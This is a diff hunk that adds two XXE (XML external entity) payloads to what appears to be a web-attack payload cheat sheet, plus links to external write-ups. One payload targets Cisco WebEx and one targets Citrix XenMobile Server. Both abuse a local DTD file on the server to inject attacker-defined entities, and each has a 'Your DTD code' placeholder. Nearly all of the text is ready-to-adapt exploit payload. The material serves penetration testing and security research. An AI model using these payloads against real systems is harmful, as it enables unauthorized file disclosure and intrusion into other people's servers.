@@ -388,6 +388,19 @@ Assuming payloads such as the previous return a verbose error. You can start poi
 ]>
 <root></root>
 ```
+### Cisco WebEx
+```
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd">
+<!ENTITY % url.attribute.set '>Your DTD code<!ENTITY test "test"'>
+%local_dtd;
+```
+### Citrix XenMobile Server
+```
+<!ENTITY % local_dtd SYSTEM "jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
+<!ENTITY % Body '>Your DTD code<!ENTITY test "test"'>
+%local_dtd;
+```
+[Payloads for Cisco and Citrix](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
 
 [Other payloads using different DTDs](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md)
 
